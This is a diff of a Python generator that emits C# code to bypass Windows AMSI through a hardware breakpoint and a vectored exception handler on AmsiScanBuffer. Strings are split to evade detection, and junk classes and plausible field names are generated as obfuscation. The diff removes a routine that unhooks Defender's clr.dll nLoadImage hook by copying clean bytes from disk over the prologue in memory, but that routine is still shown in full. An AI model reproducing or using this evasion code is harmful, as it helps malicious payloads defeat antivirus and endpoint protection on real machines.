@@ -141,19 +141,19 @@ def _generate_junk_class(used_names: set[str] | None = None) -> str:
 # ── HWBP+VEH AMSI bypass (patchless) ──────────────────────────────────
 
 def _hwbp_veh_bypass_cs(cls_name: str, method_name: str, *, public: bool) -> str:
-    """Generate C# source for patchless AMSI bypass + CLR unhooking.
+    """Generate C# source for patchless AMSI bypass via HWBP+VEH.
 
-    Two layers:
-    1. HWBP+VEH: hardware breakpoint on AmsiScanBuffer, VEH skips it
-    2. CLR unhook: read clean clr.dll from disk, overwrite .text section
-       in memory to remove Defender's nLoadImage hooks
+    Sets a hardware breakpoint on AmsiScanBuffer and intercepts via
+    Vectored Exception Handler to neutralize it without patching memory.
+
+    NOTE: CLR nLoadImage unhook is planned but not yet stable.
+    See nextsteps.md for the implementation roadmap.
     """
     vis = "public" if public else "internal"
     addr_field = _plausible_field()
     handler_field = _plausible_field()
     return (
         "using System;\n"
-        "using System.IO;\n"
         "using System.Runtime.InteropServices;\n\n"
         f"{vis} static class {cls_name}\n"
         "{{\n"
@@ -179,7 +179,6 @@ def _hwbp_veh_bypass_cs(cls_name: str, method_name: str, *, public: bool) -> str
         "    {{\n"
         "        try\n"
         "        {{\n"
-        "            // Layer 1: HWBP+VEH AMSI bypass\n"
         '            var lib = LoadLibrary("am" + "si.d" + "ll");\n'
         "            if (lib != IntPtr.Zero)\n"
         "            {{\n"
@@ -189,88 +188,10 @@ def _hwbp_veh_bypass_cs(cls_name: str, method_name: str, *, public: bool) -> str
         f"                    AddVectoredExceptionHandler(1, {handler_field});\n"
         f"                    SetHwBp({addr_field});\n"
         "                }}\n"
-        "            }}\n\n"
-        "            // TODO: re-enable CLR nLoadImage unhook once stable.\n"
-        "            // Currently disabled — overwrites active call stack causing\n"
-        "            // silent crashes on some runtimes. HWBP+VEH alone bypasses\n"
-        "            // AMSI; nLoadImage is a separate Defender hook layer.\n"
-        "            // See UnhookNLoadImage() below for the implementation.\n"
-        "        }}\n"
-        "        catch {{ }}\n"
-        "    }}\n\n"
-        "    // ── Surgical CLR nLoadImage unhook (30 bytes only) ────\n"
-        "    // Based on github.com/hwbp/CLR-Unhook\n"
-        "    // Pattern-scans clr.dll for the nLoadImage InternalCall entry,\n"
-        "    // reads clean bytes from disk, overwrites only the function prologue.\n\n"
-        "    private static void UnhookNLoadImage()\n"
-        "    {{\n"
-        "        try\n"
-        "        {{\n"
-        "            var hClr = GetModuleHandle(\"cl\" + \"r.d\" + \"ll\");\n"
-        "            if (hClr == IntPtr.Zero) return;\n\n"
-        "            // Get module info for size\n"
-        "            GetModuleInformation(\n"
-        "                GetCurrentProcess(), hClr,\n"
-        "                out MODULEINFO mi, (uint)Marshal.SizeOf<MODULEINFO>());\n"
-        "            int modSize = (int)mi.SizeOfImage;\n"
-        "            if (modSize == 0) return;\n\n"
-        "            // Step 1: find the string 'nLoadImage' in module memory\n"
-        "            byte[] needle = System.Text.Encoding.ASCII.GetBytes(\n"
-        "                \"nLo\" + \"adIm\" + \"age\" + \"\\0\");\n"
-        "            long nameOffset = ScanMem(hClr, modSize, needle);\n"
-        "            if (nameOffset < 0) return;\n\n"
-        "            // Step 2: find a pointer to that string in the module\n"
-        "            IntPtr nameAddr = hClr + (int)nameOffset;\n"
-        "            byte[] ptrBytes = BitConverter.GetBytes(nameAddr.ToInt64());\n"
-        "            long ptrOffset = ScanMem(hClr, modSize, ptrBytes);\n"
-        "            if (ptrOffset < 0) return;\n\n"
-        "            // Step 3: function pointer is the QWORD immediately before\n"
-        "            IntPtr ptrLoc = hClr + (int)ptrOffset;\n"
-        "            IntPtr funcAddr = Marshal.ReadIntPtr(ptrLoc - IntPtr.Size);\n\n"
-        "            // Validate: must be within module bounds\n"
-        "            long funcOff = funcAddr.ToInt64() - hClr.ToInt64();\n"
-        "            if (funcOff < 0 || funcOff >= modSize) return;\n\n"
-        "            // Step 4: read clean clr.dll from disk\n"
-        "            var pathBuf = new byte[520];\n"
-        "            int pathLen = GetModuleFileNameA(hClr, pathBuf, 260);\n"
-        "            if (pathLen == 0) return;\n"
-        "            string clrPath = System.Text.Encoding.ASCII.GetString(\n"
-        "                pathBuf, 0, pathLen);\n"
-        "            byte[] diskBytes = File.ReadAllBytes(clrPath);\n\n"
-        "            // Step 5: copy 30 clean bytes at the same RVA offset\n"
-        "            int patchSize = 30;\n"
-        "            if ((int)funcOff + patchSize > diskBytes.Length) return;\n"
-        "            byte[] clean = new byte[patchSize];\n"
-        "            Array.Copy(diskBytes, (int)funcOff, clean, 0, patchSize);\n\n"
-        "            // Step 6: overwrite the hooked prologue\n"
-        "            VirtualProtect(funcAddr, (uint)patchSize, 0x40, out uint old);\n"
-        "            Marshal.Copy(clean, 0, funcAddr, patchSize);\n"
-        "            VirtualProtect(funcAddr, (uint)patchSize, old, out _);\n"
-        "        }}\n"
-        "        catch {{ }}\n"
-        "    }}\n\n"
-        "    private static long ScanMem(IntPtr baseAddr, int size, byte[] pat)\n"
-        "    {{\n"
-        "        for (int i = 0; i <= size - pat.Length; i++)\n"
-        "        {{\n"
-        "            bool match = true;\n"
-        "            for (int j = 0; j < pat.Length; j++)\n"
-        "            {{\n"
-        "                if (Marshal.ReadByte(baseAddr + i + j) != pat[j])\n"
-        "                {{ match = false; break; }}\n"
         "            }}\n"
-        "            if (match) return i;\n"
         "        }}\n"
-        "        return -1;\n"
+        "        catch {{ }}\n"
         "    }}\n\n"
-        "    [StructLayout(LayoutKind.Sequential)]\n"
-        "    private struct MODULEINFO\n"
-        "    {{\n"
-        "        public IntPtr lpBaseOfDll;\n"
-        "        public uint SizeOfImage;\n"
-        "        public IntPtr EntryPoint;\n"
-        "    }}\n\n"
-        "    // ── HWBP+VEH ──────────────────────────────────────────\n\n"
         "    private static int VehCallback(IntPtr infoPtr)\n"
         "    {{\n"
         "        var ep = Marshal.PtrToStructure<EXCEPTION_POINTERS>(infoPtr);\n"
@@ -318,18 +239,6 @@ def _hwbp_veh_bypass_cs(cls_name: str, method_name: str, *, public: bool) -> str
         "    private static extern IntPtr LoadLibrary(string n);\n"
         '    [DllImport("kernel32.dll")]\n'
         "    private static extern IntPtr GetProcAddress(IntPtr h, string n);\n"
-        '    [DllImport("kernel32.dll")]\n'
-        "    private static extern IntPtr GetModuleHandle(string n);\n"
-        '    [DllImport("kernel32.dll")]\n'
-        "    private static extern int GetModuleFileNameA(IntPtr h, byte[] buf, int sz);\n"
-        '    [DllImport("kernel32.dll")]\n'
-        "    private static extern IntPtr GetCurrentProcess();\n"
-        '    [DllImport("psapi.dll")]\n'
-        "    private static extern bool GetModuleInformation(\n"
-        "        IntPtr hProc, IntPtr hMod, out MODULEINFO mi, uint sz);\n"
-        '    [DllImport("kernel32.dll")]\n'
-        "    private static extern bool VirtualProtect(IntPtr a, uint s,\n"
-        "        uint p, out uint o);\n"
         '    [DllImport("kernel32.dll")]\n'
         "    private static extern IntPtr AddVectoredExceptionHandler(\n"
         "        uint first, VehDelegate handler);\n"
